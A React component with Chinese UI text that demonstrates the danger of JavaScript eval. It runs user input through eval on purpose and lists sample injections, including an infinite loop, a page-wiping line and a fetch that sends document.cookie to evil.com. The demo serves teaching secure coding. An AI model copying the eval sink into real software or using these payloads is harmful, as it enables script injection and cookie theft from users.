import React, { useState } from 'react';

const EvalDangerDemo: React.FC = () => {
  const [input, setInput] = useState('');
  const [result, setResult] = useState('');
  const [error, setError] = useState('');

  const handleEval = () => {
    try {
      setError('');
      // ⚠️ 危險！這只是示範，實際專案中絕對不要這樣做
      const evalResult = eval(input);
      setResult(String(evalResult));
    } catch (err) {
      setError(`執行錯誤: ${err}`);
    }
  };

  const dangerousExamples = [
    {
      title: '正常數學運算',
      input: '1 + 2 * 3',
      description: '看起來無害的數學運算'
    },
    {
      title: '惡意代碼注入',
      input: 'alert("你的網站被攻擊了！"); 1 + 2',
      description: '可以執行任意 JavaScript 代碼'
    },
    {
      title: '無限循環',
      input: 'while(true){}; 1 + 2',
      description: '會讓瀏覽器凍結'
    },
    {
      title: '竊取資料',
      input: 'fetch("https://evil.com/steal?cookie=" + document.cookie); 1 + 2',
      description: '可以發送資料到外部伺服器'
    },
    {
      title: '破壞頁面',
      input: 'document.body.innerHTML = ""; 1 + 2',
      description: '可以修改或刪除頁面內容'
    }
  ];

  return (
    <div style={{ padding: '20px', maxWidth: '800px', margin: '0 auto' }}>
      <h2 style={{ color: '#e74c3c' }}>⚠️ eval 危險性示範</h2>
      <p style={{ color: '#c0392b', fontWeight: 'bold' }}>
        警告：這只是示範 eval 的危險性，實際專案中絕對不要使用 eval！
      </p>

      <div style={{ marginBottom: '20px' }}>
        <input
          type="text"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          placeholder="輸入要執行的代碼..."
          style={{ width: '100%', padding: '10px', marginBottom: '10px' }}
        />
        <button 
          onClick={handleEval}
          style={{ 
            backgroundColor: '#e74c3c', 
            color: 'white', 
            padding: '10px 20px',
            border: 'none',
            borderRadius: '4px',
            cursor: 'pointer'
          }}
        >
          執行 eval (危險！)
        </button>
      </div>

      {result && (
        <div style={{ 
          backgroundColor: '#d5f4e6', 
          padding: '10px', 
          borderRadius: '4px',
          marginBottom: '10px'
        }}>
          <strong>結果:</strong> {result}
        </div>
      )}

      {error && (
        <div style={{ 
          backgroundColor: '#fadbd8', 
          padding: '10px', 
          borderRadius: '4px',
          marginBottom: '10px'
        }}>
          <strong>錯誤:</strong> {error}
        </div>
      )}

      <div style={{ marginTop: '30px' }}>
        <h3>危險範例：</h3>
        {dangerousExamples.map((example, index) => (
          <div key={index} style={{ 
            border: '1px solid #ddd', 
            padding: '15px', 
            marginBottom: '10px',
            borderRadius: '4px'
          }}>
            <h4 style={{ color: '#e74c3c', margin: '0 0 10px 0' }}>
              {example.title}
            </h4>
            <p style={{ margin: '5px 0', fontSize: '14px' }}>
              {example.description}
            </p>
            <code style={{ 
              backgroundColor: '#f8f9fa', 
              padding: '5px', 
              borderRadius: '3px',
              fontSize: '12px'
            }}>
              {example.input}
            </code>
            <button
              onClick={() => setInput(example.input)}
              style={{
                backgroundColor: '#95a5a6',
                color: 'white',
                border: 'none',
                padding: '5px 10px',
                borderRadius: '3px',
                marginLeft: '10px',
                cursor: 'pointer',
                fontSize: '12px'
              }}
            >
              載入範例
            </button>
          </div>
        ))}
      </div>

      <div style={{ 
        backgroundColor: '#fff3cd', 
        border: '1px solid #ffeaa7',
        padding: '15px',
        borderRadius: '4px',
        marginTop: '20px'
      }}>
        <h3 style={{ color: '#856404', margin: '0 0 10px 0' }}>
          🛡️ 為什麼我的驗證方案更安全？
        </h3>
        <ul style={{ margin: '0', paddingLeft: '20px' }}>
          <li>只驗證語法，不執行代碼</li>
          <li>白名單機制，只允許預定義的運算式</li>
          <li>無法執行任意 JavaScript 代碼</li>
          <li>提供詳細的錯誤訊息</li>
          <li>型別安全，編譯時檢查</li>
        </ul>
      </div>
    </div>
  );
};

export default EvalDangerDemo; 